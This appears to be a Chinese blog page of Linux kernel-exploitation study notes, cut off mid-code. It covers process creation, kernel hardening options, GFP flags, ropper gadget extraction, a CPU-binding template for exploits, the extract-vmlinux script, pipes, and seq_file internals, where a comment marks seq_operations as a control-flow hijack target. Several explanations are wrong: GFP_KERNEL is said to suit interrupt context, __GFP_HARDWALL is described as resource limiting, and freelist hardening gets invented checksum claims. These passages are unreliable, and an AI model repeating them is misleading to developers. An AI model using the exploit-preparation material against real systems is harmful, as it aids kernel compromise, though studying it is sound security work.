通过调用系统调用函数<code>fork()</code>，一个进程可以创建一个与自身相同的副本，即父进程和子进程。调用<code>fork()</code>函数后，当前进程会复制自身，创建一个全新的进程作为子进程，而原始进程则继续执行。父进程和子进程在调用<code>fork()</code>之后同时执行，但是它们可以根据<code>fork()</code>的返回值来区分自己的角色。</li><li>调用exec()函数： 通过调用系统调用函数<code>exec()</code>，一个进程可以加载并执行一个新的可执行程序。<code>exec()</code>函数会替换当前进程的代码和数据，并开始执行新程序的指令。使用<code>exec()</code>函数创建的进程不是通过复制父进程而创建的，而是直接加载新的程序。</li></ol><p>需要注意的是，进程的创建并不是立即发生的，而是在操作系统调度时才会真正创建和执行。操作系统根据调度策略和优先级来决定进程的创建和运行顺序。</p><h1 id="补充汇编知识"><a href="#补充汇编知识" class="headerlink" title="补充汇编知识"></a>补充汇编知识</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xchg rax rsp：交换rax和rsp的值</span><br><span class="line">dec ebx：ebx自减<span class="number">1</span></span><br></pre></td></tr></table></figure><h1 id="补充某些保护"><a href="#补充某些保护" class="headerlink" title="补充某些保护"></a>补充某些保护</h1><ul><li><code>CONFIG_MEMCG_KMEM</code>：使得<code>GFP_KERNEL</code> 与 <code>GFP_KERNEL_ACCOUNT</code> 会从不一样的 <code>kmalloc-xx</code> 中进行分配</li><li><code>CONFIG_RANDOMIZE_KSTACK_OFFSET</code>：这使得固定函数调用到内核栈底的偏移值是变化的</li><li><code>SLAB_FREELIST_HARDENED</code>：这使得 freelist 有保护，不能随意控制</li><li><code>HARDENED_FREELIST</code>：该机制通过以下方式提高自由链表的安全性：<ol><li>随机化指针：<code>HARDENED_FREELIST</code>会对自由链表中的指针进行随机化处理，使攻击者难以预测或修改指针的值。这样可以防止攻击者利用已知的指针偏移或地址来修改自由链表的指针。</li><li>校验和保护：<code>HARDENED_FREELIST</code>会使用校验和来验证自由链表中的指针是否被篡改。通过计算和验证校验和，可以检测指针是否被修改，从而防止攻击者对自由链表进行恶意修改。</li><li>隔离和分割：<code>HARDENED_FREELIST</code>会将自由链表与其他内存区域进行隔离和分割，以减少攻击者对自由链表的访问和修改机会。这种隔离和分割可以通过物理或虚拟内存布局来实现。</li></ol></li><li><code>RANDOMIZE_FREELIST</code>：可以提供以下安全性优势：<ol><li>防止指针猜测：攻击者通常会尝试猜测或推断自由链表中的指针值，以便修改它们以控制内存分配。通过随机化指针，攻击者无法准确猜测指针的值，从而增加攻击的困难度。</li><li>减少重复利用：某些堆漏洞（如双重释放）可能导致攻击者重复利用自由链表中的已释放内存块。通过随机化自由链表指针，可以降低攻击者成功利用重复利用漏洞的概率。</li></ol></li></ul><h1 id="补充某些内核的知识"><a href="#补充某些内核的知识" class="headerlink" title="补充某些内核的知识"></a>补充某些内核的知识</h1><h2 id="GFP-KERNEL"><a href="#GFP-KERNEL" class="headerlink" title="GFP_KERNEL"></a>GFP_KERNEL</h2><p><code>GFP_KERNEL</code> 是 Linux 内核中用于内存分配的标志之一，它表示在内核中申请内存时使用的标志。</p><p>GFP 代表 “Get Free Page”，它是内核中用于分配页面（Page）的函数 <code>__alloc_pages()</code> 和 <code>kmalloc()</code> 的标志参数之一。<code>GFP_KERNEL</code> 是其中最常用的标志之一，它表示常规的内核内存分配。</p><p>使用 <code>GFP_KERNEL</code> 标志进行内存分配意味着：</p><ol><li>内存分配是针对内核使用的，而不是用户空间。</li><li>内存分配是在常规内核上下文中进行的，例如进程上下文或中断上下文。</li><li>内存分配是可睡眠的，即如果没有足够的可用内存，调用者可能会被置于睡眠状态，直到有足够的内存可用。</li></ol><p><code>GFP_KERNEL</code> 标志通常用于在内核中进行常规的内存分配，例如数据结构的动态分配、缓存的分配等。它提供了一种默认的内存分配策略，适用于大多数内核代码的需求。</p><h2 id="GFP-HARDWALL"><a href="#GFP-HARDWALL" class="headerlink" title="__GFP_HARDWALL"></a>__GFP_HARDWALL</h2><p><code>__GFP_HARDWALL</code> 是 Linux 内核中的一个内存分配标志，用于在内核中进行内存分配时设置特定的行为。</p><p><code>__GFP_HARDWALL</code> 标志的作用是在内存分配过程中强制执行硬壁（hardwall）策略。硬壁策略是一种内存分配的安全机制，用于防止内存资源的过度消耗。</p><p>当使用 <code>__GFP_HARDWALL</code> 标志进行内存分配时，内核会采取以下行为：</p><ol><li>限制内存分配的数量：内核会限制每个进程或上下文中的内存分配数量，以防止资源过度消耗。</li><li>强制等待：如果没有足够的可用内存，内核会强制等待，直到有足够的内存可用，而不是尝试其他的内存回收或压缩策略。</li></ol><p>通过使用 <code>__GFP_HARDWALL</code> 标志，内核可以确保内存分配不会无限制地消耗系统资源，从而提高系统的可靠性和稳定性。这对于关键任务和资源受限环境下的系统特别重要。</p><h2 id="GFP-NOWARN"><a href="#GFP-NOWARN" class="headerlink" title="__GFP_NOWARN"></a>__GFP_NOWARN</h2><p><code>__GFP_NOWARN</code> 是 Linux 内核中的一个内存分配标志，用于在内核中进行内存分配时设置特定的行为。</p><p><code>__GFP_NOWARN</code> 标志的作用是禁止内核在内存分配失败时发出警告或打印错误消息。通常，当内存分配失败时，内核会发出警告或打印错误消息，以提醒开发人员或系统管理员可能存在的问题。</p><p>使用 <code>__GFP_NOWARN</code> 标志进行内存分配时，内核会执行以下行为：</p><ol><li>禁止警告信息：内核不会发出警告或打印错误消息，即使内存分配失败。</li><li>返回 NULL 或错误码：内核可能会返回 NULL 指针或特定的错误码，以表示内存分配失败，而不是发出警告消息。</li></ol><h1 id="一些指令"><a href="#一些指令" class="headerlink" title="一些指令"></a>一些指令</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ropper --file ./vmlinux --nocolor &gt; g1</span><br><span class="line">sudo ./tiqu.sh bzImage &gt; vmlinux</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//将 exp 进程绑定至指定核心的模板：</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* to run the exp on the specific core only */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_cpu</span><span class="params">(<span class="type">int</span> core)</span>   <span class="comment">//xp中直接调用该函数，core=0 ........</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="提取vmlinux的脚本"><a href="#提取vmlinux的脚本" class="headerlink" title="提取vmlinux的脚本"></a>提取vmlinux的脚本</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment"># SPDX-License-Identifier: GPL-2.0-only</span></span><br><span class="line"><span class="comment"># ----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># extract-vmlinux - Extract uncompressed vmlinux from a kernel image</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Inspired from extract-ikconfig</span></span><br><span class="line"><span class="comment"># (c) 2009,2010 Dick Streefland &lt;dick@streefland.net&gt;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># (c) 2011      Corentin Chary &lt;corentin.chary@gmail.com&gt;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># ----------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">check_vmlinux</span></span>()</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment"># Use readelf to check if it&#x27;s a valid ELF</span></span><br><span class="line"><span class="comment"># <span class="doctag">TODO:</span> find a better to way to check that it&#x27;s really vmlinux</span></span><br><span class="line"><span class="comment">#       and not just an elf</span></span><br><span class="line">readelf -h <span class="variable">$1</span> &gt; /dev/null 2&gt;&amp;1 || <span class="built_in">return</span> 1</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> <span class="variable">$1</span></span><br><span class="line"><span class="built_in">exit</span> 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">try_decompress</span></span>()</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment"># The obscure use of the &quot;tr&quot; filter is to work around older versions of</span></span><br><span class="line"><span class="comment"># &quot;grep&quot; that report the byte offset of the line instead of the pattern.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Try to find the header ($1) and decompress from here</span></span><br><span class="line"><span class="keyword">for</span>pos <span class="keyword">in</span> `<span class="built_in">tr</span> <span class="string">&quot;<span class="variable">$1</span>\n<span class="variable">$2</span>&quot;</span> <span class="string">&quot;\n<span class="variable">$2</span>=&quot;</span> &lt; <span class="string">&quot;<span class="variable">$img</span>&quot;</span> | grep -abo <span class="string">&quot;^<span class="variable">$2</span>&quot;</span>`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">pos=<span class="variable">$&#123;pos%%:*&#125;</span></span><br><span class="line"><span class="built_in">tail</span> -c+<span class="variable">$pos</span> <span class="string">&quot;<span class="variable">$img</span>&quot;</span> | <span class="variable">$3</span> &gt; <span class="variable">$tmp</span> 2&gt; /dev/null</span><br><span class="line">check_vmlinux <span class="variable">$tmp</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Check invocation:</span></span><br><span class="line">me=<span class="variable">$&#123;0##*/&#125;</span></span><br><span class="line">img=<span class="variable">$1</span></span><br><span class="line"><span class="keyword">if</span>[ <span class="variable">$#</span> -ne 1 -o ! -s <span class="string">&quot;<span class="variable">$img</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Usage: <span class="variable">$me</span> &lt;kernel-image&gt;&quot;</span> &gt;&amp;2</span><br><span class="line"><span class="built_in">exit</span> 2</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Prepare temp files:</span></span><br><span class="line">tmp=$(<span class="built_in">mktemp</span> /tmp/vmlinux-XXX)</span><br><span class="line"><span class="built_in">trap</span> <span class="string">&quot;rm -f <span class="variable">$tmp</span>&quot;</span> 0</span><br><span class="line"></span><br><span class="line"><span class="comment"># That didn&#x27;t work, so retry after decompression.</span></span><br><span class="line">try_decompress <span class="string">&#x27;\037\213\010&#x27;</span> xy    gunzip</span><br><span class="line">try_decompress <span class="string">&#x27;\3757zXZ\000&#x27;</span> abcde unxz</span><br><span class="line">try_decompress <span class="string">&#x27;BZh&#x27;</span>          xy    bunzip2</span><br><span class="line">try_decompress <span class="string">&#x27;\135\0\0\0&#x27;</span>   xxx   unlzma</span><br><span class="line">try_decompress <span class="string">&#x27;\211\114\132&#x27;</span> xy    <span class="string">&#x27;lzop -d&#x27;</span></span><br><span class="line">try_decompress <span class="string">&#x27;\002!L\030&#x27;</span>   xxx   <span class="string">&#x27;lz4 -d&#x27;</span></span><br><span class="line">try_decompress <span class="string">&#x27;(\265/\375&#x27;</span>   xxx   unzstd</span><br><span class="line"></span><br><span class="line"><span class="comment"># Finally check for uncompressed images or objects:</span></span><br><span class="line">check_vmlinux <span class="variable">$img</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Bail out:</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$me</span>: Cannot find vmlinux.&quot;</span> &gt;&amp;2</span><br></pre></td></tr></table></figure><h1 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h1><p><a href="https://blog.csdn.net/oguro/article/details/53841949">linux管道pipe详解_linux pipe-CSDN博客</a></p><h3 id="管道的概念："><a href="#管道的概念：" class="headerlink" title="管道的概念："></a>管道的概念：</h3><p>管道是一种最基本的IPC机制，作用于有血缘关系的进程之间，完成数据传递。调用pipe系统函数即可创建一个管道。有如下特质：</p><ol><li>其本质是一个伪文件(实为内核缓冲区)</li><li>由两个文件描述符引用，一个表示读端，一个表示写端。</li><li>规定数据从管道的写端流入管道，从读端流出。</li></ol><p>管道的原理: 管道实为内核使用环形队列机制，借助内核缓冲区(4k)实现。</p><p>管道的局限性：</p><p>① 数据自己读不能自己写。</p><p>② 数据一旦被读走，便不在管道中存在，不可反复读取。</p><p>③ 由于管道采用半双工通信方式。因此，数据只能在一个方向上流动。</p><p>④ 只能在有公共祖先的进程间使用管道。</p><p>常见的通信方式有，单工通信、半双工通信、全双工通信。</p><h3 id="pipe函数"><a href="#pipe函数" class="headerlink" title="pipe函数"></a>pipe函数</h3><p>创建管道</p><p>  <code>int pipe(int pipefd[2]); 成功：0；失败：-1，设置errno</code></p><p>函数调用成功返回r&#x2F;w两个文件描述符。无需open，但需手动close。规定：fd[0] → r； fd[1] → w，就像0对应标准输入，1对应标准输出一样。向管道文件读写数据其实是在读写内核缓冲区。</p><p>管道创建成功以后，创建该管道的进程（父进程）同时掌握着管道的读端和写端。如何实现父子进程间通信呢？通常可以采用如下步骤：</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282213695.png" alt="img"> </p><ol><li>父进程调用pipe函数创建管道，得到两个文件描述符fd[0]、fd[1]指向管道的读端和写端。</li><li>父进程调用fork创建子进程，那么子进程也有两个文件描述符指向同一管道。</li><li>父进程关闭管道读端，子进程关闭管道写端。父进程可以向管道中写入数据，子进程将管道中的数据读出。由于管道是利用环形队列实现的，数据从写端流入管道，从读端流出，这样就实现了进程间通信。</li></ol><h1 id="seq-operation结构体"><a href="#seq-operation结构体" class="headerlink" title="seq_operation结构体"></a>seq_operation结构体</h1><p>本文档的Copyleft归yfydz所有，使用GPL发布，可以自由拷贝，转载，转载时请保持文档的完整性，严禁用于任何商业用途。<br>msn: <a href="mailto:yfydz_no1@hotmail.com">yfydz_no1@hotmail.com</a><br>来源：<a href="http://yfydz.cublog.cn/">http://yfydz.cublog.cn</a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在fs&#x2F;seq_file.c中定义了关于seq操作的一系列顺序读取的函数，这些函数最早是在2001年就引入了，但以前内核中一直用得不多，而到了2.6内核后，许多&#x2F;proc的只读文件中大量使用了seq函数处理。</p><p>以下内核源码版本为2.6.17.11。</p><h2 id="2-seq相关数据结构"><a href="#2-seq相关数据结构" class="headerlink" title="2.seq相关数据结构"></a>2.seq相关数据结构</h2><h3 id="2-1-seq文件结构"><a href="#2-1-seq文件结构" class="headerlink" title="2.1 seq文件结构"></a>2.1 seq文件结构</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_file</span> &#123;</span></span><br><span class="line"> <span class="type">char</span> *buf;</span><br><span class="line"> <span class="type">size_t</span> size;</span><br><span class="line"> <span class="type">size_t</span> from;</span><br><span class="line"> <span class="type">size_t</span> count;</span><br><span class="line"> <span class="type">loff_t</span> index;</span><br><span class="line"> <span class="type">loff_t</span> version;</span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">lock</span>;</span></span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> *<span class="title">op</span>;</span>   <span class="comment">//主要的利用点，可以打控制流劫持</span></span><br><span class="line"> <span class="type">void</span> *private;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>struct seq_file描述了seq处理的缓冲区及处理方法，buf是动态分配的，大小不小于PAGE_SIZE，通常这个结构是通过struct file结构中的private_data来指向的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *buf：seq流的缓冲区</span><br><span class="line"><span class="type">size_t</span> size：缓冲区大小</span><br><span class="line"><span class="type">size_t</span> from：from指向当前要显示的数据头位置</span><br><span class="line"><span class="type">size_t</span> count：缓冲区中已有的数据长度</span><br><span class="line"><span class="type">loff_t</span> index：数据记录索引值</span><br><span class="line"><span class="type">loff_t</span> version：版本号，是<span class="class"><span class="keyword">struct</span> <span class="title">file</span>的版本号的拷贝</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">lock</span>：<span class="title">seq</span>锁</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> *<span class="title">op</span>：<span class="title">seq</span>操作结构，定义数据显示的操作函数</span></span><br><span class="line"><span class="class"><span class="title">void</span> *<span class="title">private</span>：私有数据</span></span><br></pre></td></tr></table></figure><h3 id="2-2-seq操作结构"><a href="#2-2-seq操作结构" class="headerlink" title="2.2 seq操作结构"></a>2.2 seq操作结构</h3><p>seq的操作结构比较简单，就是4个操作函数，完成开始、停止、显示和取下一个操作：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* include/linux/seq_file.h */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> &#123;</span></span><br><span class="line"> <span class="type">void</span> * (*start) (<span class="keyword">struct</span> seq_file *m, <span class="type">loff_t</span> *pos);</span><br><span class="line"> <span class="type">void</span> (*stop) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v);</span><br><span class="line"> <span class="type">void</span> * (*next) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v, <span class="type">loff_t</span> *pos);</span><br><span class="line"> <span class="type">int</span> (*show) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="3-seq操作函数"><a href="#3-seq操作函数" class="headerlink" title="3.seq操作函数"></a>3.seq操作函数</h2><p>seq操作包括以下一系列函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">seq_open</span><span class="params">(<span class="keyword">struct</span> file *, <span class="keyword">struct</span> seq_operations *)</span>;</span><br></pre></td></tr></table></figure><p>打开seq流，为struct file分配struct seq_file结构，并定义seq_file的操作；</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">seq_read</span><span class="params">(<span class="keyword">struct</span> file *, <span class="type">char</span> __user *, <span class="type">size_t</span>, <span class="type">loff_t</span> *)</span>;</span><br></pre></td></tr></table></figure><p>从seq流中读数据到用户空间，其中循环调用了struct seq_file中的各个函数来读数据；</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">seq_read</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">char</span> __user *buf, <span class="type">size_t</span> size, <span class="type">loff_t</span> *ppos)</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">seq_file</span> *<span class="title">m</span> =</span> (<span class="keyword">struct</span> seq_file *)file-&gt;private_data;</span><br><span class="line"> <span class="type">size_t</span> copied = <span class="number">0</span>;</span><br><span class="line"> <span class="type">loff_t</span> pos;</span><br><span class="line"> <span class="type">size_t</span> n;</span><br><span class="line"> <span class="type">void</span> *p;</span><br><span class="line"> <span class="type">int</span> err = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 先加锁</span></span><br><span class="line"> mutex_lock(&amp;m-&gt;lock);</span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment"> \* seq_file-&gt;op-&gt;..m_start/m_stop/m_next may do special actions</span></span><br><span class="line"><span class="comment"> \* or optimisations based on the file-&gt;f_version, so we want to</span></span><br><span class="line"><span class="comment"> \* pass the file-&gt;f_version to those methods.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> \* seq_file-&gt;version is just copy of f_version, and seq_file</span></span><br><span class="line"><span class="comment"> \* methods can treat it simply as file version.</span></span><br><span class="line"><span class="comment"> \* It is copied in first and copied out after all operations.</span></span><br><span class="line"><span class="comment"> \* It is convenient to have it as part of structure to avoid the</span></span><br><span class="line"><span class="comment"> \* need of passing another argument to all the seq_file methods.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> m-&gt;version = file-&gt;f_version;</span><br><span class="line"> <span class="comment">/* grab buffer if we didn&#x27;t have one */</span></span><br><span class="line"><span class="comment">// 如果struct seq_file结构中的缓冲区没有分配的话，</span></span><br><span class="line"><span class="comment">// 分配缓冲，大小为PAGE_SIZE</span></span><br><span class="line"> <span class="keyword">if</span> (!m-&gt;buf) &#123;</span><br><span class="line"> m-&gt;buf = kmalloc(m-&gt;size = PAGE_SIZE, GFP_KERNEL);</span><br><span class="line"> <span class="keyword">if</span> (!m-&gt;buf)</span><br><span class="line">  <span class="keyword">goto</span> Enomem;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="comment">/* if not empty - flush it first */</span></span><br><span class="line"><span class="comment">// count表示当时有多少数据还没有传给用户空间</span></span><br><span class="line"><span class="comment">// 尽量先将这些数据传出</span></span><br><span class="line"> <span class="keyword">if</span> (m-&gt;count) &#123;</span><br><span class="line"> n = min(m-&gt;count, size);</span><br><span class="line"> err = copy_to_user(buf, m-&gt;buf + m-&gt;from, n);</span><br><span class="line"> <span class="keyword">if</span> (err)</span><br><span class="line">  <span class="keyword">goto</span> Efault;</span><br><span class="line"> m-&gt;count -= n;</span><br><span class="line"> m-&gt;from += n;</span><br><span class="line"> size -= n;</span><br><span class="line"> buf += n;</span><br><span class="line"> copied += n;</span><br><span class="line"> <span class="keyword">if</span> (!m-&gt;count)</span><br><span class="line">  m-&gt;index++;</span><br><span class="line"> <span class="keyword">if</span> (!size)</span><br><span class="line">  <span class="keyword">goto</span> Done;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="comment">// 进行主要传数据过程，缓冲区中至少要有一个记录单位的数据</span></span><br><span class="line"> <span class="comment">/* we need at least one record in buffer */</span></span><br><span class="line"> <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"><span class="comment">// 数据记录的位置</span></span><br><span class="line"> pos = m-&gt;index;</span><br><span class="line"><span class="comment">// 初始化操作，返回值为对象相关指针</span></span><br><span class="line"> p = m-&gt;op-&gt;start(m, &amp;pos);</span><br><span class="line"> err = PTR_ERR(p);</span><br><span class="line"> <span class="keyword">if</span> (!p || IS_ERR(p))</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">// 执行具体的显示过程</span></span><br><span class="line"> err = m-&gt;op-&gt;show(m, p);</span><br><span class="line"> <span class="keyword">if</span> (err)</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">// 当前缓冲区中的实际数据小于缓冲区大小，转到填数据部分</span></span><br><span class="line"> <span class="keyword">if</span> (m-&gt;count &lt; m-&gt;size)</span><br><span class="line">  <span class="keyword">goto</span> Fill;</span><br><span class="line"><span class="comment">// 否则说明一个记录的数据量太大，原来缓冲区大小不够；</span></span><br><span class="line"><span class="comment">// 先停操作，重新分配缓冲区，大小增加一倍，重新操作,</span></span><br><span class="line"><span class="comment">// 要保证缓冲区大小大于一个数据记录的大小</span></span><br><span class="line"> m-&gt;op-&gt;stop(m, p);</span><br><span class="line"> kfree(m-&gt;buf);</span><br><span class="line"> m-&gt;buf = kmalloc(m-&gt;size &lt;&lt;= <span class="number">1</span>, GFP_KERNEL);</span><br><span class="line"> <span class="keyword">if</span> (!m-&gt;buf)</span><br><span class="line">  <span class="keyword">goto</span> Enomem;</span><br><span class="line"> m-&gt;count = <span class="number">0</span>;</span><br><span class="line"> m-&gt;version = <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> m-&gt;op-&gt;stop(m, p);</span><br><span class="line"> m-&gt;count = <span class="number">0</span>;</span><br><span class="line"> <span class="keyword">goto</span> Done;</span><br><span class="line">Fill:</span><br><span class="line"><span class="comment">// 继续读数据到缓冲区</span></span><br><span class="line"> <span class="comment">/* they want more? let&#x27;s try to get some more */</span></span><br><span class="line"> <span class="keyword">while</span> (m-&gt;count &lt; size) &#123;</span><br><span class="line"> <span class="type">size_t</span> offs = m-&gt;count;</span><br><span class="line"> <span class="type">loff_t</span> next = pos;</span><br><span class="line"> p = 